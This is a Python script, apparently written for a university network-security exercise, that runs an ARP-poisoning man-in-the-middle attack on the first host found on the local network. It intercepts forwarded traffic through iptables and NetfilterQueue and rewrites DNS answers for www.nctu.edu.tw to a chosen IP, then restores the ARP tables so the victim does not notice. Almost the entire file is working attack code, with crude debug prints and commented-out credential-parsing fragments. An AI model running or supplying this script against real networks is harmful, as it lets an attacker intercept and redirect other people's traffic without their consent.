#!/usr/bin/python3
import os
import time
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import re
import socket
import sys
from netfilterqueue import NetfilterQueue
import netifaces
from scapy.all import *
from scan_all_device import scan_all_device, get_device_list

domain = 'www.nctu.edu.tw' # domain to be spoofed
localIP = '140.113.207.246' # IP address for poisoned hosts.
os.system('sudo iptables -I FORWARD -j NFQUEUE --queue-num 1')


def callback(packet):
	# print("sss")
	payload = packet.get_payload()
	pkt = IP(payload)
	# print("yooy")
	# print(domain)
	if not pkt.haslayer(DNSRR):
		# print("fuck\n")
		# print(packet.summary())
		packet.accept()
	else:
		print(domain)
		print(str(pkt[DNS].qd.qname))
		# print(packet.summary())
		if domain in str(pkt[DNS].qd.qname):
			if pkt["DNS Resource Record"].type == 1:
				print("dick")
				# response = DNSRR(rrname = domain, rdata = localIP)
				# pkt[DNS].an = response
				# pkt[DNS].ancount = 1

				del pkt[IP].len
				del pkt[IP].chksum

				del pkt[UDP].len
				del pkt[UDP].chksum
				# del pkt[DNS].ns
				del pkt[DNS].ar

				# packet.set_payload(pkt) 
				# pkt = DNS(an=DNSRR(rrname=pkzzzt[DNS].qd.qname, rdata=localIP))
				for x in range(pkt[DNS].ancount):
					pkt[DNS].an[x].rdata = localIP
				packet.set_payload(bytes(pkt))
				print(pkt.show())
				packet.accept()
				# send(pkt)
				# print("Spoofing DNS response to: {}".format(spoofed_pkt.summary()))
			else:
				print("ipv6")
				packet.drop()
		else:
			print("chick")
			# print(packet.summary())
			packet.accept()
			# print("Spoofing DNS response to: {}".format(spoofed_pkt.summary()))

def querysniff(pkt):
	if IP in pkt:
		ip_src = pkt[IP].src
		ip_dst = pkt[IP].dst
		if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 1:
			# print(str(ip_src) + " -> " + str (ip_dst) + " :  (" + (pkt.getlayer(DNS).qd.name) +")")
			# if str(pkt[DNS].qname) == "b'www.nctu.edu.tw'":
			#if "www.nctu.edu.tw" in str(pkt["DNS Question Record"].qname) and pkt["DNS Resource Record"].type == 1:
			if "www.nctu.edu.tw" in str(pkt["DNS Question Record"].qname):
				print("dick\n")
				# print(pkt[DNS].show())
				for x in range(pkt[DNS].ancount):
					#pkt[DNSRR][x].rdata = "140.113.207.246"
					print(pkt[DNSRR][x].rdata)
					send(pkt)
				# print(pkt[DNS].an[1].rdata())

#get what we are messing with
def packet_callback(packet):
	if packet[UDP].payload:
		pkt = str(packet[UDP].payload)
		if packet[UDP].dport == 53 or packet[UDP].sport == 53:
			# tok1, tok2, tok3, tok4 = "usr", "pwd", "&pwd", "&btn"
			# index1, index2, index3, index4 = pkt.find(tok1), pkt.find(tok2), pkt.find(tok3), pkt.find(tok4)
			# print("index1 = {}, index2 = {}".format(index1, index2))
			# if pkt.find(tok1) != -1:
			udp_payload = str(packet[UDP].payload)
			types(packet[UDP].payload)
			print("\n{} ----DNS----> {}:{}:\n==================UDP payload==================\n{}\n==================UDP payload==================\n".format(packet[IP].src, packet[IP].dst, packet[IP].dport, udp_payload))
				# print(pkt[index1:index3]+"  "+pkt[index2:index4])

def getInfo(victimIP):
	print("~~~Getting addresses...")
	#interface = input("interface:")
	interface = "ens33"
	#victimIP = input("victimIP:")
	# victimIP = "192.168.204.128"
	routerIP = getRouterIP()
	return [interface, victimIP, routerIP]

def getRouterIP():
	gw = netifaces.gateways()
	routerIP = gw['default'][2][0]
	return routerIP

#turn on port forwarding until restart
def setIPForwarding(toggle):
	if(toggle == True):
		print("~~~Turing on IP forwarding...")
		os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
	if(toggle == False):
		print("~~~Turing off IP forwarding...")
		os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')

#need to get mac addresses of vitcim and router
#do this by generating ARP requests, which are made
#for getting MAC addresses
def get_MAC(ip, interface):

	#set verbose to 0, least stuff printed (range: 0-4) (4 is max I think)
	#conf.verb = 4
	
	# srp() send/recive packets at layer 2 (ARP)
	# Generate a Ether() for ethernet connection/ARP request (?)
	# timeout 2, units seconds(?) 
	# interface, wlan0, wlan1, etc...
	# inter, time .1 seconds to retry srp()
	# returns  IDK yet
	answer, unanswer = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = ip), timeout = 2, iface=interface, inter = 0.1, verbose=0)

	#I'm not exactly sure as to what how this works, but it gets the data we need
	for send,recieve in answer:
		return recieve.sprintf(r"%Ether.src%")

#this is too restablish the connection between the router
#and victim after we are done intercepting IMPORTANT
#victim will notice very quickly if this isn't done
def reassignARP(victimIP, routerIP, interface):
	print("~~~Reassigning ARPS...")

	#get victimMAC
	victimMAC = get_MAC(victimIP, interface)
	
	#get routerMAC
	routerMAC = get_MAC(routerIP, interface)

	#send ARP request to router as-if from victim to connect, 
	#do it 7 times to be sure
	send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC, retry=7),verbose=0)

	#send ARP request to victim as-if from router to connect
	#do it 7 times to be sure
	send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC, retry=7),verbose=0)

	#don't need this anymore
	setIPForwarding(False)

#this is the actuall attack
#sends a single ARP request to both targets
#saying that we are the other the other target
#so it's puts us inbetween!
#funny how it's the smallest bit of code
def attack(victimIP, victimMAC, routerIP, routerMAC):
	send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC),verbose=0)
	send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC),verbose=0)

def sniffer(packet):
	http_packet = packet
	print (http_packet)

def manInTheMiddle(victimIP):

	info = getInfo(victimIP)
	# print(info)
	# info = ['en0', '162.246.145.218', '10.141.248.214']
	setIPForwarding(True)
	# setIPForwarding(False)

	print("~~~Getting MACs...")
	try:
		victimMAC = get_MAC(info[1], info[0])
	except Exception as e:
		setIPForwarding(False)
		print("~!~Error getting victim MAC...")
		print(e)
		sys.exit(1)

	try:
		routerMAC = get_MAC(info[2], info[0])
	except Exception as e:
		setIPForwarding(False)
		print("~!~Error getting router MAC...")
		print(e)
		sys.exit(1)

	print("~~~Victim MAC: %s" % victimMAC)
	print("~~~Router MAC: %s" % routerMAC)
	print("~~~Attacking...")
	pid = os.fork()
	if pid != 0:
		while True:
			try:
				attack(info[1], victimMAC, info[2], routerMAC)
				time.sleep(1.5)
			except KeyboardInterrupt:
				reassignARP(info[1], info[2], info[0])
				break

	else:
		#ppp = sniff(filter="udp and port 53", prn=querysniff, store=0, iface="ens33")
		q = NetfilterQueue()
		q.bind(1, callback)
		try:
			# print("suck\n")
			q.run() # Main loop
		except KeyboardInterrupt:
			q.unbind()
			os.system('iptables -F')
			os.system('iptables -X')
	sys.exit(1)

if __name__ == "__main__":
	scan_all_device()
	routerIP = str(getRouterIP()) + "/24"
	device_list = get_device_list(routerIP)
	# print(device_list[0]["ip"])
	manInTheMiddle(device_list[0]["ip"])
